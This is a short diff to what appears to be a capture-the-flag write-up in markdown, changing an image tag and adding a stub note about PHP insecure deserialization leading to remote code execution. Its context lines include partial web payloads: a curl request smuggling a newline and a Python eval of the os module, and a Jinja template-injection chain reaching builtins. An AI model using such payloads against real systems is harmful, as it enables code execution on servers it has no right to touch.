@@ -79,7 +79,7 @@ curl -G https://chall1.pxxl.xyz/run_file -d "code=-c%0aeval(\"__import__(\'os\')
 
 ---------------
 
-<img width="496" height="747" alt="image" src="https://github.com/user-attachments/assets/5fa6bf38-41f2-42f1-9866-0447c27c6504" />
+![image](https://github.com/user-attachments/assets/5fa6bf38-41f2-42f1-9866-0447c27c6504)
 
 ---------------
 
@@ -101,6 +101,13 @@ x: "{{config.__init__.__globals__.__getitem__('__BUILTINS__'.lower()).__getitem_
 ![image](https://github.com/user-attachments/assets/9bb1bb33-8913-4bf3-be94-5e2f4796dfe5)
 
 ----------------
+
+### Zeezy's notes
+
+-----------------
+
+- Vulnerability-: Php Insecure Deserialization(Privesc to Remote Code Execution)
+- 
 
 
 
